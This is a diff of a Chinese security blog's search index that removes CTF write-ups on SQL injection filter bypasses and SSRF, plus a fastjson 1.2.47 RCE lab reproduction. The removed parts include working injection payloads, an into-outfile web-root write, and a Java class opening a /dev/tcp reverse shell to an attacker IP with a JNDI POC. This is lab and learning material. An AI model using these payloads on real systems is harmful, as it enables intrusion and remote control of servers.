class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">flag &#x3D; flagstr.replace(&#39;numA&#39;,&#39;1&#39;).replace(&#39;numB&#39;,&#39;2&#39;).replace(&#39;numC&#39;,&#39;3&#39;).replace(&#39;numD&#39;,&#39;4&#39;).replace(&#39;numE&#39;,&#39;5&#39;).replace(&#39;numF&#39;,&#39;6&#39;).replace(&#39;numG&#39;,&#39;7&#39;).replace(&#39;numH&#39;,&#39;8&#39;).replace(&#39;numI&#39;,&#39;9&#39;).replace(&#39;numJ&#39;,&#39;0&#39;)</span><br><span class="line"></span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625173838607"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select to_base64(username), to_base64 (password) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1&#39; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;,&#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&#39;1&#39;,&#39;numA&#39;),&#39;2&#39;,&#39;numB&#39;),&#39;3&#39;,&#39;numC&#39;),&#39;4&#39;,&#39;numD&#39;),&#39;5&#39;,&#39;numE&#39;),&#39;6&#39;,&#39;numF&#39;),&#39;7&#39;,&#39;numG&#39;),&#39;8&#39;, &#39;numH&#39;),&#39;9&#39;, &#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from ctfshow_user4 where username&#x3D; &#39;flag&#39; limit 1,1--+</span><br></pre></td></tr></table></figure>
-<p>借助web174的思路，既然可以通过<code>hex</code>绕过，那就去试试</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">numFnumCnumGnumDnumFnumFnumGnumCnumFnumHnumFFnumGnumGnumGBnumCnumHnumFnumCnumCnumCnumCnumDnumFnumAnumCnumAnumFnumBnumFnumAnumBDnumCnumDnumFnumFnumCnumAnumCnumEnumBDnumCnumDnumFnumDnumFnumFnumFnumEnumBDnumCnumHnumFnumDnumFnumAnumCnumAnumBDnumCnumDnumCnumJnumCnumAnumFnumCnumFnumAnumFnumBnumCnumInumCnumDnumCnumHnumFnumBnumCnumFnumCnumGnumGD</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">63746673686F777B38633334613162612D346631352D346466652D386461312D3430316361623934386236377D</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210625180231493"></p>
-<h3 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>\xnn    匹配ASCII代码中十六进制代码为nn的字符</p>
-<p>[\x00-\x7f]     匹配ASCII值从0-127的字符</p>
-</blockquote>
-<h4 id="利用读写文件写入网站根目录into-outfile注入"><a href="#利用读写文件写入网站根目录into-outfile注入" class="headerlink" title="利用读写文件写入网站根目录into outfile注入"></a>利用读写文件写入网站根目录into outfile注入</h4><p>字段数仍然是二（虽然不会回显，但是错误的话会报接口的错误）</p>
-<p>仿照web174构造</p>
-<p><code>1&#39; union select username,password from ctfshow_user5 where username=&quot;flag&quot; into outfile &#39;/var/www/html/ctfshow.txt&#39; --+ </code></p>
-<p>在网站根目录下写入文件<code>ctfshow.txt</code></p>
-<blockquote>
-<p>Apache默认根目录是:/var/www/html</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709100434410"></p>
-<h4 id="二分法盲注"><a href="#二分法盲注" class="headerlink" title="二分法盲注"></a>二分法盲注</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于无过滤的sql注入，可以通过<code>十六进制</code>或<code>base64</code>编码替换进行绕过，还可以跑盲注脚本，利用二分法或sleep()函数；还可以尝试是否有权限写入网站根目录文件，然后直接访问该文件</p>
-<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
-<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
-<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
-<h2 id="day5-web入门之sql注入-过滤注入"><a href="#day5-web入门之sql注入-过滤注入" class="headerlink" title="day5 web入门之sql注入-过滤注入"></a>day5 web入门之sql注入-过滤注入</h2><h3 id="web176-select被过滤"><a href="#web176-select被过滤" class="headerlink" title="web176-select被过滤"></a>web176-select被过滤</h3><p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709105105072"></p>
-<p><code>1&#39; Union select 1,2,3--+</code>无回显</p>
-<p><code>1&#39; union Select 1,2,3--+</code>有回显</p>
-<p>经过测试是只对<code>select</code>进行了过滤，通过大小写绕过</p>
-<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39; union Select 1,group_concat(username),group_concat(password) from ctfshow_user where username=&quot;flag&quot;--+</code></p>
-<h3 id="web177-空格和-被过滤"><a href="#web177-空格和-被过滤" class="headerlink" title="web177-空格和#被过滤"></a>web177-空格和#被过滤</h3><p><code>1&#39;--+</code>无回显，<code>1&#39;--</code>无回显，<code>--</code>被过滤</p>
-<p><code>1&#39;#</code>无回显，<code>#</code>也被过滤，使用url编码<code>%23</code>绕过，<code>1&#39;%23</code>有回显</p>
-<p>而在判断字段时又没有回显，好家伙原来吧空格也过滤了，使用<code>/**/</code>绕过，字段数还是3</p>
-<blockquote>
-<p>空格绕过的方式：</p>
-<ol>
-<li>注释符<code>/**/</code>，tab键<code>%a0</code></li>
-<li>括号绕过，常用于时间盲注</li>
-</ol>
-</blockquote>
-<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;/**/union/**/select/**/1,group_concat(username),group_concat(password)/**/from/**/ctfshow_user/**/where/**/username=&quot;flag&quot;/**/%23</code></p>
-<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p><code>/**/</code>和<code>%a0</code>被过滤，使用括号或是<code>%0a,%09,%0b,%0c,%0d</code>都行</p>
-<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union(select(1),(username),(password)from(ctfshow_user)where(username=&quot;flag&quot;))%23</code></p>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709170348722"></p>
-<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p>只剩下<code>%0c</code>可以用了，其他都被过滤了</p>
-<p><img src="https://i.loli.net/2021/07/09/iQ5YydxOWqcsouf.png" alt="image-20210709172329770"></p>
-<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union%0cselect%0c1,username,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&quot;flag&quot;%0c%0c%23</code></p>
-<p><img src="https://i.loli.net/2021/07/09/AGwtTmJbDRxkiPN.png" alt="image-20210709173023533"></p>
-<p>晴天师傅的通杀payload</p>
-<p><code>?id=&#39;or(1)%23</code></p>
-<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>是对<code>%23</code>进行了过滤，不能注释后面的’了，只能通过构造<code>&#39;1&#39;=&#39;1</code></p>
-<p>贴上Y4tacker师傅的</p>
-<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p><code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
-<p>-1就是用来注释的，这个payload也相当于<code>&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
-<p>放进这个拼接的语句中就是<code>where username !=&#39;flag&#39; and id=&#39;&#39;or(id=26)and&#39;1&#39;=&#39;1&#39; limit 1;&quot;</code></p>
-<p><img src="https://i.loli.net/2021/07/09/N2JdzpWZDRIHT16.png" alt="image-20210709200537410"></p>
-<p>又因为and的优先级比or高，那就又相当于</p>
-<p><code>(username !=&#39;flag&#39; and id = &#39;&#39;)  or  (id=26 and&#39;1&#39;=&#39;1&#39;)</code></p>
-<p>or右边的值为1，可以读出id=26的数据</p>
-<p>还可以盲注</p>
-<p><img src="https://i.loli.net/2021/07/09/vQoe79qtV3Pjg2z.png" alt="image-20210709201034411"></p>
-<h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><p>除了括号其他能代替的都被过滤了，继续使用y4师傅的payload</p>
-<p><img src="https://i.loli.net/2021/07/09/SvKtyFL3j4oGA7g.png" alt="image-20210709210302177"></p>
-<h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><p>这次又把<code>flag</code>给过滤了，继续用师傅的payload</p>
-<p><img src="https://i.loli.net/2021/07/09/MxH1Q9EOYT7FNyG.png" alt="image-20210709212746118"></p>
-<h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><p>我是fw</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/Vinson404/p/7253255.html">sql注入绕过技巧</a></p>
-<h2 id="参考博客-1"><a href="#参考博客-1" class="headerlink" title="参考博客"></a>参考博客</h2><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
-<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
-<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
-]]></content>
-      <categories>
-        <category>ctf-sql</category>
-      </categories>
-      <tags>
-        <tag>ctf-sql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfhub之ssrf</title>
-    <url>/2021/07/19/ctfhub%E4%B9%8Bssrf/</url>
-    <content><![CDATA[<h1 id="ctfshow之ssrf"><a href="#ctfshow之ssrf" class="headerlink" title="ctfshow之ssrf"></a>ctfshow之ssrf</h1><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><h2 id="内网访问（http协议）"><a href="#内网访问（http协议）" class="headerlink" title="内网访问（http协议）"></a>内网访问（http协议）</h2><p>尝试访问位于127.0.0.1的flag.php吧</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>直接构造url<code>?url=http://127.0.0.1/flag.php</code></p>
-<p><img src="https://i.loli.net/2021/07/19/ZWTUa7RtHKGEQe4.png" alt="image-20210719213700332"></p>
-<h2 id="伪协议读取文件（file协议）"><a href="#伪协议读取文件（file协议）" class="headerlink" title="伪协议读取文件（file协议）"></a>伪协议读取文件（file协议）</h2><p>尝试去读取一下Web目录下的flag.php吧</p>
-<p>linux网站的默认目录是<code>/var/www/html</code></p>
-<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p><code>?url=file:///var/www/html/flag.php</code></p>
-<p><img src="https://i.loli.net/2021/07/19/milXBUDKG3nLSIw.png" alt="image-20210719214708812"></p>
-<p>右键查看页面源码</p>
-<p><img src="https://i.loli.net/2021/07/19/SzAmxP7aE5Yd8wV.png" alt="image-20210719214812341"></p>
-<h2 id="端口扫描（http-dict协议）"><a href="#端口扫描（http-dict协议）" class="headerlink" title="端口扫描（http/dict协议）"></a>端口扫描（http/dict协议）</h2><p>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦,</p>
-<blockquote>
-<p>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</p>
-</blockquote>
-<p>这里要对ip进行内网端口探测，使用burp抓包跑一下</p>
-<p>对端口参数添加一下变量</p>
-<p><img src="https://i.loli.net/2021/07/19/SGa76DWRfLE1hkp.png" alt="image-20210719220453504"></p>
-<blockquote>
-<p>这里还可以是dict协议</p>
-</blockquote>
-<p>设置一下参数</p>
-<p><img src="https://i.loli.net/2021/07/19/N1MW9yt2AOE8DFx.png" alt="image-20210719220428828"></p>
-<p>根据长度找到开放的端口为8347，flag存在于响应包中</p>
-<p><img src="https://i.loli.net/2021/07/19/Tbrcm2OsxAEa4n3.png" alt="image-20210719220708156"></p>
-<h2 id="第二部分-gopher协议"><a href="#第二部分-gopher协议" class="headerlink" title="第二部分 gopher协议"></a>第二部分 gopher协议</h2><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p>
-<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>index.php</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#39;url&#39;]))&#123;</span><br><span class="line">    header(&quot;Location: &#x2F;?url&#x3D;_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch &#x3D; curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>dnslog盲打</title>
-    <url>/2021/09/18/dnslog%E7%9B%B2%E6%89%93/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>docker基本使用</title>
-    <url>/2021/05/08/docker%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">docker安装教程</a></p>
-<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="镜像相关操作"><a href="#镜像相关操作" class="headerlink" title="镜像相关操作"></a>镜像相关操作</h2><h3 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker search 镜像名</span><br></pre></td></tr></table></figure>
-<h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull 镜像名</span><br></pre></td></tr></table></figure>
-<h3 id="查看所有镜像"><a href="#查看所有镜像" class="headerlink" title="查看所有镜像"></a>查看所有镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/18/Kc418tknQyboP2B.png" alt="image-20210417215354480"></p>
-<h3 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 本机端口：容器端口 镜像名称</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>参数解释：</p>
-<p>-d 镜像在后台运行</p>
-<p>-p 指定本机与容器内部交互的端口 -P则是随机开放一个端口与容器内部ID映射</p>
-<p>也就是将后面的<em>acgpiano/sqli-labs的80端口</em>映射到前面的主机某一端口</p>
-</blockquote>
-<p>例：<del>把本机的8801端口映射到容器的8801端口</del>，事实证明sqli-labs容器的端口必须是80，不然会失败</p>
-<p><img src="https://i.loli.net/2021/07/18/3SrifKmUEc4gDjH.png" alt="image-20210417222849702"></p>
-<blockquote>
-<p>请注意这张图片中的容器端口8801是错误的</p>
-</blockquote>
-<p>但是会报错，是因为没有开启ipv4转发</p>
-<blockquote>
-<p><a href="https://blog.csdn.net/yelllowcong/article/details/78295600">IPv4 forwarding is disabled. Networking will not work.</a></p>
-</blockquote>
-<p>进入配置文件，修改<em>net.ipv4.ip_forward=1</em></p>
-<p><img src="https://i.loli.net/2021/07/18/SzxIcodBJ8OKXlP.png" alt="image-20210417222634372"></p>
-<p>重启服务并查看修改是否成功</p>
-<p><img src="https://i.loli.net/2021/07/18/eEBdl8F42iau5h7.png" alt="image-20210417222728689"></p>
-<blockquote>
-<p>还要记得把刚刚运行镜像的容器删除，不然会有容器已存在的报错</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/07/18/bw2fHrsI69uhdyN.png" alt="image-20210418160119935"></p>
-<blockquote>
-<p>成功访问</p>
-</blockquote>
-<h2 id="容器的相关操作"><a href="#容器的相关操作" class="headerlink" title="容器的相关操作"></a>容器的相关操作</h2><h3 id="查看正在运行的容器"><a href="#查看正在运行的容器" class="headerlink" title="查看正在运行的容器"></a>查看正在运行的容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker ps -a 查看运行过的容器</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/18/iObYJydP1umQ5ea.png" alt="image-20210417223707346"></p>
-<h3 id="进入容器内部"><a href="#进入容器内部" class="headerlink" title="进入容器内部"></a>进入容器内部</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/18/fqElpH7iRYBAKDQ.png" alt="image-20210417223949376"></p>
-<p><img src="https://i.loli.net/2021/07/18/aNjniAr1lCGOJe5.png" alt="image-20210418160159989"></p>
-<h3 id="退出容器-exit"><a href="#退出容器-exit" class="headerlink" title="退出容器 exit"></a>退出容器 exit</h3><h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop 容器id</span><br></pre></td></tr></table></figure>
-<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rm 容器id</span><br></pre></td></tr></table></figure>
-<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi 镜像id</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>删除容器和镜像时需要注意的是：</p>
-<p>因为是镜像启动后会产生容器，要删除镜像的话必须先删除容器</p>
-</blockquote>
-<h2 id="构建镜像并发布自己的项目"><a href="#构建镜像并发布自己的项目" class="headerlink" title="构建镜像并发布自己的项目"></a>构建镜像并发布自己的项目</h2><p><a href="https://blog.csdn.net/wzsy_ll/article/details/82866627">详见大佬博客</a></p>
-]]></content>
-      <categories>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>fastjson-1.2.24-rce</title>
     <url>/2021/09/16/fastjson-1-2-24-rce/</url>
     <content><![CDATA[<h2 id="fastjson-1-2-24-rce"><a href="#fastjson-1-2-24-rce" class="headerlink" title="fastjson-1.2.24-rce"></a>fastjson-1.2.24-rce</h2><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><p>java处理JSON数据有三个比较流行的类库</p>
@@ -459,9 +397,21 @@
 <h3 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h3><ul>
 <li>记得开启防火墙对应端口并在安全组添加策略，或是直接关闭防火墙</li>
 </ul>
-<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>攻击机：vps</p>
-<p>环境</p>
-<p><img src="https://i.loli.net/2021/11/24/V3gPZriuHDywfnh.png" alt="image-20211124153322616"></p>
+<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>靶机环境查看</p>
+<p><img src="https://i.loli.net/2021/12/03/jUCiARL2yBewhDI.png" alt="image-20211203161603128"></p>
+<blockquote>
+<p>这里由于未刷新配置文件<code>etc/profile</code>导致原先的配置未能成功</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/12/03/2B4FTtKuYpyaxgL.png" alt="image-20211203162545035"></p>
+<p>刷新之后</p>
+<p><img src="https://i.loli.net/2021/12/03/KuqPaHfUTjlbiOF.png" alt="image-20211203162658895"></p>
+<p>靶机：jdk1.8.0_301、Apache Maven 3.3.9、fastjson1.2.47</p>
+<p>攻击机：jdk1.8.0_301、Apache Maven 3.3.9、marshalsec</p>
+<h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><h4 id="1-编写恶意类，编译为class文件"><a href="#1-编写恶意类，编译为class文件" class="headerlink" title="1. 编写恶意类，编译为class文件"></a>1. 编写恶意类，编译为class文件</h4><h4 id="2-python起一个http服务，监听6666端口"><a href="#2-python起一个http服务，监听6666端口" class="headerlink" title="2.python起一个http服务，监听6666端口"></a>2.python起一个http服务，监听6666端口</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 6666</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/12/03/58HWwsnxve3cONi.png" alt="image-20211203171847689"></p>
+<h4 id="3-marshalsec起一个RMI服务，监听9999端口"><a href="#3-marshalsec起一个RMI服务，监听9999端口" class="headerlink" title="3.marshalsec起一个RMI服务，监听9999端口"></a>3.marshalsec起一个RMI服务，监听9999端口</h4><p><img src="https://i.loli.net/2021/12/03/jgRihLkn6vGePHb.png" alt="image-20211203171453252"></p>
+<p><img src="https://i.loli.net/2021/12/03/HfeF894rzNILTk1.png" alt="image-20211203172248399"></p>
+<h4 id="4-burp构造请求包"><a href="#4-burp构造请求包" class="headerlink" title="4.burp构造请求包"></a>4.burp构造请求包</h4><p><img src="https://i.loli.net/2021/12/03/aQAxJ4B5goOjRiw.png" alt="image-20211203175926384"></p>
 <h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://www.cnblogs.com/CoLo/p/14499041.html">Fastjson1.2.24RCE漏洞复现</a></p>
 <p><a href="https://www.freebuf.com/articles/web/242712.html">Fastjson1.2.24漏洞复现详细过程（freebuf）</a></p>
 <p><a href="https://www.cnblogs.com/cute-puli/p/13466362.html">漏洞复现-fastjson1.2.24-RCE</a></p>
@@ -470,50 +420,6 @@
       <categories>
         <category>fastjson</category>
       </categories>
-      <tags>
-        <tag>fastjson</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>fastjson 1.2.47-rce</title>
-    <url>/2021/09/20/fastjson-1-2-47-rce/</url>
-    <content><![CDATA[<h2 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson 1.2.47-rce"></a>fastjson 1.2.47-rce</h2><p><img src="https://i.loli.net/2021/09/22/nuHJF8jqwGcCmXz.png" alt="img"></p>
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>靶机：jdk1.8.0_301、Apache Maven 3.3.9、fastjson1.2.47</p>
-<p>攻击机：jdk1.8.0_301、Apache Maven 3.3.9、marshalsec</p>
-<p><img src="https://i.loli.net/2021/09/22/mJi7VDOIvstxu4k.png" alt="image-20210922211752091"></p>
-<p>注意jdk版本会影响该漏洞复现</p>
-<ul>
-<li>两种不同协议实现反弹shell有jdk版本要求,<strong>而且最后接收shell的vps的JDK版本要和靶机的版本相近</strong></li>
-</ul>
-<blockquote>
-<p>下图jdk版本不存在该漏洞</p>
-<p><img src="https://i.loli.net/2021/09/22/Nw3SFaVJGCIRXg8.png" alt="img"></p>
-</blockquote>
-<p>访问8090端口</p>
-<p><img src="https://i.loli.net/2021/09/22/Z1IapGmlACtJzw2.png" alt="image-20210922200207047"></p>
-<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>同fastjson1.2.24复现步骤</p>
-<h4 id="1-编译生成恶意类-class"><a href="#1-编译生成恶意类-class" class="headerlink" title="1.编译生成恶意类.class"></a>1.编译生成恶意类.class</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class Exploit &#123;</span><br><span class="line">    public Exploit()&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;接收shell的ip&#x2F;8888 0&gt;&amp;1&quot;);</span><br><span class="line">        &#125;catch(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] argv)&#123;</span><br><span class="line">        Exploit e &#x3D; new Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="2-python开启一个临时web服务SimpleHTTPServer"><a href="#2-python开启一个临时web服务SimpleHTTPServer" class="headerlink" title="2.python开启一个临时web服务SimpleHTTPServer"></a>2.python开启一个临时web服务<code>SimpleHTTPServer</code></h4><p><code>python -m  SimpleHTTPServer 4444</code></p>
-<blockquote>
-<p><strong>为了接收LDAP服务重定向请求</strong>，并需要在payload目录下开启，这样才能访问到payload文件</p>
-</blockquote>
-<h4 id="3-marshalsec开启LDAP或是RMI监听"><a href="#3-marshalsec开启LDAP或是RMI监听" class="headerlink" title="3.marshalsec开启LDAP或是RMI监听"></a>3.marshalsec开启LDAP或是RMI监听</h4><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.j marshalsec.jndi.RMIRefServer &quot;http://攻击者ip:4444/#Exploit&quot; 9999</code></p>
-<blockquote>
-<p>借助LDAP服务将LDAP reference result 重定向到web服务器</p>
-<p>LDAP动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管</p>
-</blockquote>
-<h4 id="4-burp发送poc"><a href="#4-burp发送poc" class="headerlink" title="4.burp发送poc"></a>4.burp发送poc</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 靶机ip</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko&#x2F;20100101 Firefox&#x2F;18.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q&#x3D;0.8,en-us;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 264</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;攻击者ip:9999&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="https://i.loli.net/2021/09/23/YgxWpiS7dbhQnoH.png" alt="image-20210923113053182"></p>
-<p>注：所有的工具和编译文件要放在同一目录下，并且python开启http服务也在当前目录</p>
